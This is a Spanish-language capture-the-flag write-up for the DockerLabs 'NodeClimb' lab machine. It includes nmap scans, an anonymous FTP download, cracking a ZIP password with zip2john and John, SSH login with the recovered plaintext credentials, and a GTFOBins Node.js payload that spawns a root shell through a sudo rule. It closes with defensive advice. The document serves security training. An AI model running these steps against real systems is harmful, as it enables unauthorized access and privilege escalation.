# NodeClimb — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** El Pingüino de Mario  
**Fecha de creación:** 05/07/2024  
**Técnicas:** FTP Anonymous · ZIP Cracking · John · SSH · Node.js sudo abuse · GTFOBins

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración FTP — acceso anonymous](#2-enumeración-ftp--acceso-anonymous)
3. [Cracking ZIP — zip2john y John](#3-cracking-zip--zip2john-y-john)
4. [Acceso SSH](#4-acceso-ssh)
5. [Escalada de privilegios](#5-escalada-de-privilegios)
6. [Lección aprendida](#6-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos la máquina vulnerable:

```bash
sudo bash auto_deploy.sh nodeclimb.tar
```

> IP asignada: `172.17.0.2`

Comprobamos conectividad:

```bash
ping -c 4 172.17.0.2
```

Realizamos un escaneo básico:

```bash
nmap -Pn 172.17.0.2
```

Resultado:

```text
21/tcp open ftp
22/tcp open ssh
```

Enumeramos versiones:

```bash
nmap -p21,22 -sCV -Pn 172.17.0.2
```

Servicios detectados:

```text
vsftpd 3.0.3
OpenSSH 9.2p1
```

El escaneo también revela:

```text
Anonymous FTP login allowed
```

Además encontramos:

```text
secretitopicaron.zip
```

---

## 2. Enumeración FTP — acceso anonymous

Accedemos por FTP:

```bash
ftp 172.17.0.2
```

Usuario:

```text
anonymous
```

Listamos contenido:

```bash
ls
```

Descargamos el ZIP:

```bash
get secretitopicaron.zip
```

---

## 3. Cracking ZIP — zip2john y John

Intentamos extraer el ZIP:

```bash
unzip secretitopicaron.zip
```

El archivo requiere contraseña.

Generamos el hash:

```bash
zip2john secretitopicaron.zip > hash
```

Crackeamos con John:

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Resultado:

```text
password: secretitopicaron
```

Extraemos el contenido:

```bash
unzip secretitopicaron.zip
```

Leemos el fichero:

```bash
cat password.txt
```

Resultado:

```text
mario:laKontraseñaAmasmalotaHdElbarrioH
```

---

## 4. Acceso SSH

Accedemos mediante SSH:

```bash
ssh mario@172.17.0.2
```

Contraseña:

```text
laKontraseñaAmasmalotaHdElbarrioH
```

Comprobamos privilegios sudo:

```bash
sudo -l
```

Resultado:

```text
(root) NOPASSWD: /usr/bin/node /home/mario/script.js
```

---

## 5. Escalada de privilegios

Consultamos GTFOBins para Node.js.

Payload utilizado:

```javascript
require('child_process').spawn('/bin/sh', {stdio: [0, 1, 2]})
```

Editamos el fichero permitido:

```bash
nano /home/mario/script.js
```

Ejecutamos:

```bash
sudo /usr/bin/node /home/mario/script.js
```

Verificamos privilegios:

```bash
whoami
root
```

✅ Somos **root**.

---

## 6. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| FTP Anonymous habilitado | Exposición de archivos sensibles |
| ZIP protegido con contraseña débil | Filtración de credenciales |
| Credenciales almacenadas en texto plano | Acceso SSH |
| Node.js ejecutable con sudo | Escalada a root |

**Para defenderse:**

- Deshabilitar acceso FTP anonymous.
- Utilizar contraseñas robustas en archivos comprimidos.
- No almacenar credenciales en texto plano.
- Restringir binarios peligrosos ejecutables con sudo.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
